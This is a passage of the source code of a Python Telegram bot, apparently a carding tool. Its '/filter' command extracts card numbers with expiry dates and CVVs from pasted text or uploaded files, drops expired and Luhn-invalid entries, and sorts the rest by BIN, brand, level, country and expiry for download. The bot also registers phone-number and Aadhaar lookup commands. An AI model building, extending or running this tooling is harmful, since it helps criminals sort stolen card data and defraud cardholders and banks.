async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/remove <user_id>`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    approved_all.discard(uid)
    approved_users.discard(uid)
    for k in CMD_KEYS:
        approved_cmds[k].discard(uid)
    banned_users.discard(uid)
    save_users()
    
    await update.message.reply_text(f"🗑️ Removed user `{uid}` from all lists", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/ban <user_id>`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    banned_users.add(uid)
    approved_all.discard(uid)
    approved_users.discard(uid)
    for k in CMD_KEYS:
        approved_cmds[k].discard(uid)
    save_users()
    
    await update.message.reply_text(f"🚫 Banned user `{uid}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/unban <user_id>`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    banned_users.discard(uid)
    save_users()
    
    await update.message.reply_text(f"✅ Unbanned user `{uid}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

# ==== 13.5 /filter Command - Fast Card Filter & Organizer ====
_filter_sessions = {}  # Store filter sessions

def _escape_md(text: str) -> str:
    """Escape Markdown special characters"""
    if not text:
        return ""
    # Escape: _ * [ ] ( ) ~ ` > # + - = | { } . !
    chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for c in chars:
        text = text.replace(c, f'\\{c}')
    return text

def _parse_cards_fast(text: str) -> list:
    """Fast card parsing with regex - returns list of card dicts"""
    if not text:
        return []
    
    cards = []
    seen = set()
    
    # Normalize separators
    text = text.replace('\r', '\n')
    
    # Pattern for card: 13-19 digits, then separator, MM, separator, YY/YYYY, separator, CVV
    pattern = r'(\d{13,19})[|\s/\\:;,._-]+(\d{1,2})[|\s/\\:;,._-]+(\d{2,4})[|\s/\\:;,._-]+(\d{3,4})'
    
    for match in re.finditer(pattern, text):
        cc, mm, yy, cvv = match.groups()
        
        # Normalize
        mm = mm.zfill(2)
        yy = yy[-2:] if len(yy) == 4 else yy.zfill(2)
        
        # Validate
        if not (1 <= int(mm) <= 12):
            continue
        if len(cvv) < 3:
            continue
        
        # Create unique key
        key = f"{cc}|{mm}|{yy}|{cvv}"
        if key in seen:
            continue
        seen.add(key)
        
        # Check if expired
        try:
            year = 2000 + int(yy)
            month = int(mm)
            now = datetime.now()
            if year < now.year or (year == now.year and month < now.month):
                continue  # Skip expired
        except:
            continue
        
        # Luhn check
        digits = [int(d) for d in cc]
        checksum = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
        if checksum % 10 != 0:
            continue
        
        cards.append({
            'cc': cc,
            'mm': mm,
            'yy': yy,
            'cvv': cvv,
            'bin': cc[:6],
            'formatted': key
        })
    
    return cards

def _organize_cards(cards: list) -> dict:
    """Organize cards by BIN, month, year - FAST version (no API calls)"""
    result = {
        'by_bin': {},
        'by_month': {},
        'by_year': {},
        'by_brand': {},
        'by_type': {},
        'by_level': {},
        'by_country': {},
        'by_year_month': {},
        'all': cards,
        '_bin_info_loaded': False  # Flag for lazy loading
    }
    
    # Single pass: organize by basic fields only (FAST)
    for card in cards:
        bin_num = card['bin']
        mm = card['mm']
        yy = card['yy']
        
        # By BIN
        if bin_num not in result['by_bin']:
            result['by_bin'][bin_num] = []
        result['by_bin'][bin_num].append(card)
        
        # By month
        if mm not in result['by_month']:
            result['by_month'][mm] = []
        result['by_month'][mm].append(card)
        
        # By year
        if yy not in result['by_year']:
            result['by_year'][yy] = []
        result['by_year'][yy].append(card)
        
        # By year+month
        ym_key = f"{yy}_{mm}"
        if ym_key not in result['by_year_month']:
            result['by_year_month'][ym_key] = []
        result['by_year_month'][ym_key].append(card)
    
    return result

def _load_bin_details_lazy(organized: dict) -> None:
    """Load BIN details lazily when needed (for brand/type/level/country)"""
    if organized.get('_bin_info_loaded'):
        return
    
    # Sort BINs by card count and limit to top 100 for speed
    sorted_bins = sorted(organized['by_bin'].items(), key=lambda x: -len(x[1]))[:100]
    
    for bin_num, cards_list in sorted_bins:
        try:
            # Use cached lookup (fast)
            info_str, details = get_bin_info(bin_num)
            if not details:
                continue
            
            # By Brand
            brand = (details.get('brand') or '').upper()
            if brand and brand != 'UNKNOWN':
                if brand not in organized['by_brand']:
                    organized['by_brand'][brand] = []
                organized['by_brand'][brand].extend(cards_list)
            
            # By Type
            card_type = (details.get('type') or '').upper()
            if card_type and card_type != 'UNKNOWN':
                if card_type not in organized['by_type']:
                    organized['by_type'][card_type] = []
                organized['by_type'][card_type].extend(cards_list)
            
            # By Level
            level = (details.get('level') or '').upper()
            if level:
                if level not in organized['by_level']:
                    organized['by_level'][level] = []
                organized['by_level'][level].extend(cards_list)
            
            # By Country
            country = details.get('country') or details.get('country_name') or ''
            country_flag = details.get('country_flag') or ''
            if country:
                country_key = f"{country_flag} {country}" if country_flag else country
                if country_key not in organized['by_country']:
                    organized['by_country'][country_key] = []
                organized['by_country'][country_key].extend(cards_list)
        except:
            continue
    
    organized['_bin_info_loaded'] = True

async def filter_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fast card filter command - extracts, validates, and organizes cards"""
    uid = update.effective_user.id
    uname = update.effective_user.username or update.effective_user.first_name or "User"
    
    if not is_approved(uid, "filter"):
        await update.message.reply_text("⛔ You are not approved to use /filter", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("filter"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    # Get input data
    data_text = ""
    
    if update.message.reply_to_message:
        replied = update.message.reply_to_message
        
        # Check for file
        if replied.document:
            if replied.document.file_size > 15 * 1024 * 1024:
                await update.message.reply_text("⚠️ File too large. Max 15MB.", reply_to_message_id=update.message.message_id)
                return
            
            msg = await update.message.reply_text("📥 Downloading...", reply_to_message_id=update.message.message_id)
            try:
                file = await context.bot.get_file(replied.document.file_id)
                file_bytes = await file.download_as_bytearray()
                data_text = file_bytes.decode('utf-8', errors='ignore')
                await msg.edit_text("🔍 Processing...")
            except Exception as e:
                await msg.edit_text(f"❌ Download failed: {str(e)[:50]}")
                return
        else:
            data_text = replied.text or replied.caption or ""
    else:
        data_text = " ".join(context.args) if context.args else ""
    
    if not data_text.strip():
        await update.message.reply_text(
            "🔍 *Fast Card Filter*\n\n"
            "*Usage:*\n"
            "• `/filter <data>` - Filter cards from text\n"
            "• Reply to message with `/filter`\n"
            "• Reply to file with `/filter`\n\n"
            "*Features:*\n"
            "• ⚡ Ultra-fast processing\n"
            "• ✅ Luhn validation\n"
            "• 📅 Expiry check\n"
            "• 🏦 BIN lookup\n"
            "• 📊 Organize by BIN/Month/Year\n\n"
            "*Max file size:* 15MB",
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id
        )
        return
    
    # Process
    start = time.time()
    msg = await update.message.reply_text("⚡ Filtering cards...", reply_to_message_id=update.message.message_id)
    
    try:
        # Parse cards (fast)
        cards = _parse_cards_fast(data_text)
        
        if not cards:
            await msg.edit_text("❌ No valid cards found.\n\nMake sure format is: `CC|MM|YY|CVV`", parse_mode="Markdown")
            return
        
        # Organize
        organized = _organize_cards(cards)
        
        # Create session
        session_id = f"f_{uid}_{int(time.time())}"
        _filter_sessions[session_id] = {
            'data': organized,
            'user': uname,
            'count': len(cards),
            'created': time.time()
        }
        
        # Clean old sessions (older than 30 min)
        now = time.time()
        for sid in list(_filter_sessions.keys()):
            if now - _filter_sessions[sid].get('created', 0) > 1800:
                del _filter_sessions[sid]
        
        duration = round(time.time() - start, 2)
        
        # Build stats (fast - no BIN lookups yet)
        bins_count = len(organized['by_bin'])
        years = sorted(organized['by_year'].keys())
        months_count = len(organized['by_month'])
        
        # Create buttons - simple layout
        buttons = [
            [InlineKeyboardButton("📥 Download All", callback_data=f"f_dl:{session_id}")],
            [
                InlineKeyboardButton(f"🏦 BIN ({bins_count})", callback_data=f"f_bin:{session_id}"),
                InlineKeyboardButton("💳 Brand", callback_data=f"f_brand:{session_id}")
            ],
            [
                InlineKeyboardButton("🔖 Type", callback_data=f"f_type:{session_id}"),
                InlineKeyboardButton("⭐ Level", callback_data=f"f_level:{session_id}")
            ],
            [
                InlineKeyboardButton("🌍 Country", callback_data=f"f_country:{session_id}"),
                InlineKeyboardButton("📅 Year+Month", callback_data=f"f_ym:{session_id}")
            ],
            [
                InlineKeyboardButton(f"📅 Month ({months_count})", callback_data=f"f_month:{session_id}"),
                InlineKeyboardButton(f"📆 Year ({len(years)})", callback_data=f"f_year:{session_id}")
            ],
            [
                InlineKeyboardButton("🔍 Search", callback_data=f"f_search:{session_id}"),
                InlineKeyboardButton("🗑️ Clear", callback_data=f"f_clear:{session_id}")
            ]
        ]
        
        await msg.edit_text(
            f"✅ *Filter Complete*\n\n"
            f"📊 Cards: `{len(cards):,}`\n"
            f"🏦 BINs: `{bins_count}`\n"
            f"📆 Years: `{', '.join(years)}`\n\n"
            f"⏱ `{duration}s` 👤 {_escape_md(uname)}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:100]}")

async def filter_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle filter command callbacks"""
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    data = query.data
    if not data or not data.startswith("f_"):
        return
    
    parts = data.split(":")
    action = parts[0]
    session_id = parts[1] if len(parts) > 1 else None
    extra = parts[2] if len(parts) > 2 else None
    
    if not session_id or session_id not in _filter_sessions:
        await query.edit_message_text("❌ Session expired. Run /filter again.")
        return
    
    session = _filter_sessions[session_id]
    organized = session['data']
    
    # Back button
    def back_btn():
        return InlineKeyboardButton("⬅️ Back", callback_data=f"f_back:{session_id}")
    
    # Download all
    if action == "f_dl":
        cards = organized['all']
        content = "\n".join([c['formatted'] for c in cards])
        filename = f"filtered_{len(cards)}_{int(time.time())}.txt"
        
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=filename,
            caption=f"📥 {len(cards):,} cards\n👤 {session['user']}"
        )
        return
    
    # By BIN list
    elif action == "f_bin":
        bins = sorted(organized['by_bin'].items(), key=lambda x: -len(x[1]))[:20]
        
        buttons = []
        for bin_num, cards in bins:
            info_str, details = get_bin_info(bin_num)
            flag = (details or {}).get('country_flag', '')
            brand = (details or {}).get('brand', '')[:4]
            buttons.append([InlineKeyboardButton(
                f"{flag} {bin_num} | {brand} | {len(cards)}",
                callback_data=f"f_getbin:{session_id}:{bin_num}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            f"🏦 *Top BINs* (showing 20)\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific BIN
    elif action == "f_getbin":
        bin_num = extra
        cards = organized['by_bin'].get(bin_num, [])
        
        if not cards:
            await query.answer("No cards for this BIN")
            return
        
        content = "\n".join([c['formatted'] for c in cards])
        info_str, details = get_bin_info(bin_num)
        flag = (details or {}).get('country_flag', '')
        
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"bin_{bin_num}_{len(cards)}.txt",
            caption=f"🏦 BIN: {bin_num} {flag}\n📊 Cards: {len(cards)}\n💳 {info_str}"
        )
        return
    
    # By Month
    elif action == "f_month":
        months = sorted(organized['by_month'].keys())
        month_names = ['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        
        buttons = []
        row = []
        for mm in months:
            count = len(organized['by_month'][mm])
            name = month_names[int(mm)] if int(mm) <= 12 else mm
            row.append(InlineKeyboardButton(f"{name} ({count})", callback_data=f"f_getmonth:{session_id}:{mm}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "📅 *By Expiry Month*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific month
    elif action == "f_getmonth":
        mm = extra
        cards = organized['by_month'].get(mm, [])
        
        if not cards:
            await query.answer("No cards for this month")
            return
        
        content = "\n".join([c['formatted'] for c in cards])
        month_names = ['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        name = month_names[int(mm)] if int(mm) <= 12 else mm
        
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"month_{mm}_{len(cards)}.txt",
            caption=f"📅 Month: {name}\n📊 Cards: {len(cards)}"
        )
        return
    
    # By Year
    elif action == "f_year":
        years = sorted(organized['by_year'].keys())
        
        buttons = []
        row = []
        for yy in years:
            count = len(organized['by_year'][yy])
            row.append(InlineKeyboardButton(f"20{yy} ({count})", callback_data=f"f_getyear:{session_id}:{yy}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "📆 *By Expiry Year*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific year
    elif action == "f_getyear":
        yy = extra
        cards = organized['by_year'].get(yy, [])
        
        if not cards:
            await query.answer("No cards for this year")
            return
        
        content = "\n".join([c['formatted'] for c in cards])
        
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"year_20{yy}_{len(cards)}.txt",
            caption=f"📆 Year: 20{yy}\n📊 Cards: {len(cards)}"
        )
        return
    
    # By Brand (lazy load BIN details)
    elif action == "f_brand":
        # Load BIN details if not already loaded
        _load_bin_details_lazy(organized)
        
        brands = sorted(organized['by_brand'].items(), key=lambda x: -len(x[1]))
        
        if not brands:
            await query.answer("No brand data available")
            return
        
        buttons = []
        for brand, cards_list in brands[:15]:
            buttons.append([InlineKeyboardButton(
                f"💳 {brand} ({len(cards_list)})",
                callback_data=f"f_getbrand:{session_id}:{brand[:20]}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "💳 *By Brand*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific brand
    elif action == "f_getbrand":
        brand = extra
        cards_list = organized['by_brand'].get(brand, [])
        
        if not cards_list:
            await query.answer("No cards for this brand")
            return
        
        content = "\n".join([c['formatted'] for c in cards_list])
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"brand_{brand}_{len(cards_list)}.txt",
            caption=f"💳 Brand: {brand}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # By Type (lazy load BIN details)
    elif action == "f_type":
        _load_bin_details_lazy(organized)
        
        types = sorted(organized['by_type'].items(), key=lambda x: -len(x[1]))
        
        if not types:
            await query.answer("No type data available")
            return
        
        buttons = []
        for card_type, cards_list in types:
            emoji = "💳" if card_type == "CREDIT" else "💵" if card_type == "DEBIT" else "🎫"
            buttons.append([InlineKeyboardButton(
                f"{emoji} {card_type} ({len(cards_list)})",
                callback_data=f"f_gettype:{session_id}:{card_type}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "🔖 *By Card Type*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific type
    elif action == "f_gettype":
        card_type = extra
        cards_list = organized['by_type'].get(card_type, [])
        
        if not cards_list:
            await query.answer("No cards for this type")
            return
        
        content = "\n".join([c['formatted'] for c in cards_list])
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"type_{card_type}_{len(cards_list)}.txt",
            caption=f"🔖 Type: {card_type}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # By Level (lazy load BIN details)
    elif action == "f_level":
        _load_bin_details_lazy(organized)
        
        levels = sorted(organized['by_level'].items(), key=lambda x: -len(x[1]))
        
        if not levels:
            await query.answer("No level data available")
            return
        
        buttons = []
        for level, cards_list in levels[:15]:
            buttons.append([InlineKeyboardButton(
                f"⭐ {level} ({len(cards_list)})",
                callback_data=f"f_getlevel:{session_id}:{level[:20]}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "⭐ *By Card Level*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific level
    elif action == "f_getlevel":
        level = extra
        cards_list = organized['by_level'].get(level, [])
        
        if not cards_list:
            await query.answer("No cards for this level")
            return
        
        content = "\n".join([c['formatted'] for c in cards_list])
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"level_{level}_{len(cards_list)}.txt",
            caption=f"⭐ Level: {level}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # By Country (lazy load BIN details)
    elif action == "f_country":
        _load_bin_details_lazy(organized)
        
        countries = sorted(organized['by_country'].items(), key=lambda x: -len(x[1]))
        
        if not countries:
            await query.answer("No country data available")
            return
        
        buttons = []
        for country, cards_list in countries[:15]:
            # Use first 20 chars of country name for callback data
            country_short = country.replace(" ", "_")[:20]
            buttons.append([InlineKeyboardButton(
                f"{country} ({len(cards_list)})",
                callback_data=f"f_getcountry:{session_id}:{country_short}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "🌍 *By Country*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific country
    elif action == "f_getcountry":
        country_short = extra.replace("_", " ") if extra else ""
        # Find matching country
        cards_list = []
        country_full = country_short
        for country, cl in organized['by_country'].items():
            if country.replace(" ", "_")[:20] == extra:
                cards_list = cl
                country_full = country
                break
        
        if not cards_list:
            await query.answer("No cards for this country")
            return
        
        content = "\n".join([c['formatted'] for c in cards_list])
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"country_{len(cards_list)}.txt",
            caption=f"🌍 Country: {country_full}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # By Year+Month
    elif action == "f_ym":
        # First show years to select
        years = sorted(organized['by_year'].keys())
        
        buttons = []
        row = []
        for yy in years:
            count = len(organized['by_year'][yy])
            row.append(InlineKeyboardButton(f"20{yy} ({count})", callback_data=f"f_ymyear:{session_id}:{yy}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "📅 *Year+Month Filter*\n\nFirst, select a year:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Year+Month - year selected, show months
    elif action == "f_ymyear":
        yy = extra
        month_names = ['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        
        # Get months for this year
        buttons = []
        row = []
        for mm in ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']:
            ym_key = f"{yy}_{mm}"
            cards_list = organized['by_year_month'].get(ym_key, [])
            if cards_list:
                name = month_names[int(mm)]
                row.append(InlineKeyboardButton(
                    f"{name} ({len(cards_list)})",
                    callback_data=f"f_getym:{session_id}:{ym_key}"
                ))
                if len(row) == 3:
                    buttons.append(row)
                    row = []
        if row:
            buttons.append(row)
        
        if not buttons:
            await query.answer("No cards for this year")
            return
        
        buttons.append([InlineKeyboardButton("⬅️ Back to Years", callback_data=f"f_ym:{session_id}")])
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            f"📅 *Year 20{yy}*\n\nSelect month:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific year+month
    elif action == "f_getym":
        ym_key = extra  # Format: "27_05"
        cards_list = organized['by_year_month'].get(ym_key, [])
        
        if not cards_list:
            await query.answer("No cards for this period")
            return
        
        yy, mm = ym_key.split("_")
        month_names = ['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        month_name = month_names[int(mm)] if int(mm) <= 12 else mm
        
        content = "\n".join([c['formatted'] for c in cards_list])
        await query.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"20{yy}_{month_name}_{len(cards_list)}.txt",
            caption=f"📅 Period: {month_name} 20{yy}\n📊 Cards: {len(cards_list)}"
        )
        return
    
    # Search BIN
    elif action == "f_search":
        context.user_data[f"filter_search_{query.from_user.id}"] = session_id
        
        await query.edit_message_text(
            "🔍 *BIN Search*\n\n"
            "Send a BIN (6 digits) to search:\n\n"
            "Example: `411111`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[back_btn()]])
        )
        return
    
    # Clear session
    elif action == "f_clear":
        if session_id in _filter_sessions:
            del _filter_sessions[session_id]
        await query.edit_message_text("🗑️ Session cleared.")
        return
    
    # Back to main menu
    elif action == "f_back":
        cards = organized['all']
        bins_count = len(organized['by_bin'])
        years = sorted(organized['by_year'].keys())
        months_count = len(organized['by_month'])
        
        buttons = [
            [InlineKeyboardButton("📥 Download All", callback_data=f"f_dl:{session_id}")],
            [
                InlineKeyboardButton(f"🏦 BIN ({bins_count})", callback_data=f"f_bin:{session_id}"),
                InlineKeyboardButton("💳 Brand", callback_data=f"f_brand:{session_id}")
            ],
            [
                InlineKeyboardButton("🔖 Type", callback_data=f"f_type:{session_id}"),
                InlineKeyboardButton("⭐ Level", callback_data=f"f_level:{session_id}")
            ],
            [
                InlineKeyboardButton("🌍 Country", callback_data=f"f_country:{session_id}"),
                InlineKeyboardButton("📅 Year+Month", callback_data=f"f_ym:{session_id}")
            ],
            [
                InlineKeyboardButton(f"📅 Month ({months_count})", callback_data=f"f_month:{session_id}"),
                InlineKeyboardButton(f"📆 Year ({len(years)})", callback_data=f"f_year:{session_id}")
            ],
            [
                InlineKeyboardButton("🔍 Search", callback_data=f"f_search:{session_id}"),
                InlineKeyboardButton("🗑️ Clear", callback_data=f"f_clear:{session_id}")
            ]
        ]
        
        await query.edit_message_text(
            f"✅ *Filter Results*\n\n"
            f"📊 Cards: `{len(cards):,}`\n"
            f"🏦 BINs: `{bins_count}`\n"
            f"📆 Years: `{', '.join(years)}`\n\n"
            f"👤 {_escape_md(session['user'])}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

# ==== 14. Text Message Handler for Bin Search ====
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages for bin search in /clean and /filter commands"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    # Check if user is in /filter bin search mode
    filter_key = f"filter_search_{user_id}"
    if filter_key in context.user_data:
        session_id = context.user_data[filter_key]
        del context.user_data[filter_key]
        
        if session_id not in _filter_sessions:
            await update.message.reply_text("❌ Session expired. Run /filter again.", reply_to_message_id=update.message.message_id)
            return
        
        # Extract BIN
        bin_match = re.search(r'(\d{6})', text)
        if not bin_match:
            await update.message.reply_text("❌ Invalid BIN. Send 6 digits.", reply_to_message_id=update.message.message_id)
            return
        
        bin_num = bin_match.group(1)
        session = _filter_sessions[session_id]
        cards = session['data']['by_bin'].get(bin_num, [])
        
        if not cards:
            info_str, details = get_bin_info(bin_num)
            flag = (details or {}).get("country_flag", "")
            await update.message.reply_text(
                f"🔍 BIN {bin_num} not found in your data.\n\n💳 {info_str} {flag}",
                reply_to_message_id=update.message.message_id
            )
            return
        
        content = "\n".join([c['formatted'] for c in cards])
        info_str, details = get_bin_info(bin_num)
        flag = (details or {}).get("country_flag", "")
        
        await update.message.reply_document(
            document=BytesIO(content.encode()),
            filename=f"bin_{bin_num}_{len(cards)}.txt",
            caption=f"🏦 BIN: {bin_num} {flag}\n📊 Cards: {len(cards)}\n💳 {info_str}",
            reply_to_message_id=update.message.message_id
        )
        return
    
    # Check if user is in /clean bin search mode
    session_key = f"bin_search_session_{user_id}"
    if session_key in context.user_data:
        session_id = context.user_data[session_key]
        
        # Remove the session key
        del context.user_data[session_key]
        
        # Check if session still exists
        if session_id not in context.user_data:
            await update.message.reply_text("❌ Session expired. Please run /clean again.", reply_to_message_id=update.message.message_id)
            return
        
        session_data = context.user_data[session_id]
        organized_data = session_data['organized']
        
        # Extract BIN from text (first 6 digits)
        bin_match = re.search(r'(\d{6})', text)
        if not bin_match:
            await update.message.reply_text("❌ Invalid BIN format. Please provide 6 digits.", reply_to_message_id=update.message.message_id)
            return
        
        bin_num = bin_match.group(1)
        
        # Get cards for this BIN
        cards = organized_data['by_bin'].get(bin_num, [])
        
        if not cards:
            # Try to get bin info
            bin_info_str, bin_details = get_bin_info(bin_num)
            flag = (bin_details or {}).get("country_flag", "")
            info_line = f"Info: {bin_info_str}{(' ' + flag) if flag else ''}"
            await update.message.reply_text(
                f"🔍 BIN `{bin_num}` not found in your cleaned data.\n\n{info_line}",
                reply_to_message_id=update.message.message_id,
            )
            return
        
        # Create file with cards for this BIN
        file_content = "\n".join([card['formatted'] for card in cards])
        file_name = f"bin_{bin_num}_{int(time.time())}.txt"
        
        # Get bin info
        bin_info_str, bin_details = get_bin_info(bin_num)
        
        try:
            with BytesIO(file_content.encode('utf-8')) as file_buffer:
                file_buffer.name = file_name
                
                flag = (bin_details or {}).get("country_flag", "")
                info_line = f"🏦 Info: {bin_info_str}{(' ' + flag) if flag else ''}"
                await context.bot.send_document(
                    chat_id=update.message.chat.id,
                    document=file_buffer,
                    caption=(
                        f"🔍 BIN: `{bin_num}`\n"
                        f"📁 Cards: {len(cards):,}\n"
                        f"{info_line}\n"
                        f"👤 User: {session_data['username']}"
                    ),
                    reply_to_message_id=update.message.message_id
                )
        except Exception as e:
            await update.message.reply_text(f"❌ Error sending file: {str(e)[:100]}", reply_to_message_id=update.message.message_id)

# ==== 15. Dispatcher Entry Point ====
def _start_health_server_if_needed() -> None:
    """
    Railway "web" services expect the process to bind to $PORT.
    This bot uses long-polling, so we start a tiny built-in HTTP server for health checks.
    """
    port_raw = os.environ.get("PORT")
    if not port_raw:
        return

    try:
        port = int(port_raw)
    except ValueError:
        print(f"⚠️ Invalid PORT value: {port_raw!r} (skipping health server)")
        return

    if port <= 0:
        return

    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            if self.path in ("/", "/health", "/healthz"):
                body = b"ok"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            self.send_response(404)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"not found")

        def log_message(self, format, *args):  # noqa: A002
            # Keep logs clean on Railway
            return

    class ReusableThreadingHTTPServer(ThreadingHTTPServer):
        allow_reuse_address = True

    try:
        server = ReusableThreadingHTTPServer(("0.0.0.0", port), Handler)
    except OSError as e:
        print(f"⚠️ Failed to bind health server on 0.0.0.0:{port}: {e}")
        return

    thread = threading.Thread(target=server.serve_forever, name="health-server", daemon=True)
    thread.start()
    print(f"✅ Health server listening on 0.0.0.0:{port}")


async def main():
    # Ensure helpers/subprocesses always see the resolved token
    global BOT_TOKEN
    token = os.environ.get("BOT_TOKEN")
    if not token:
        print("❌ BOT_TOKEN environment variable is required")
        return
    BOT_TOKEN = token

    _start_health_server_if_needed()

    # Load BIN databases once at startup
    load_bin_databases()

    # If polling crashes (network hiccups, Telegram issues, etc.), restart without recursion.
    while True:
        # Railway Pro optimizations: Better concurrency and timeout settings
        app = (
            ApplicationBuilder()
            .token(token)
            .concurrent_updates(True)  # Handle multiple users simultaneously
            .connect_timeout(30.0)
            .read_timeout(30.0)
            .write_timeout(30.0)
            .pool_timeout(30.0)
            .get_updates_connect_timeout(30.0)
            .get_updates_read_timeout(30.0)
            .get_updates_pool_timeout(30.0)
            .build()
        )

        # Basic commands
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("cmds", cmds_cmd))
        app.add_handler(CommandHandler("id", id_cmd))
        app.add_handler(CommandHandler("bin", bin_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("health", health_cmd))
        app.add_handler(CommandHandler("version", version_cmd))
        app.add_handler(CommandHandler("ver", version_cmd))
        app.add_handler(CommandHandler("sort", sort_cmd))
        app.add_handler(CommandHandler("clean", clean_cmd))
        app.add_handler(CommandHandler("filter", filter_cmd))

        # New commands
        app.add_handler(CommandHandler("num", num_cmd))
        app.add_handler(CommandHandler("adhar", adhar_cmd))

        # Callback handlers - FIXED PATTERNS with shorter prefixes
        app.add_handler(CallbackQueryHandler(sort_callback, pattern="^s_"))
        app.add_handler(CallbackQueryHandler(clean_callback, pattern="^c_"))
        app.add_handler(CallbackQueryHandler(filter_callback, pattern="^f_"))

        # Admin commands
        app.add_handler(CommandHandler("approve", approve))
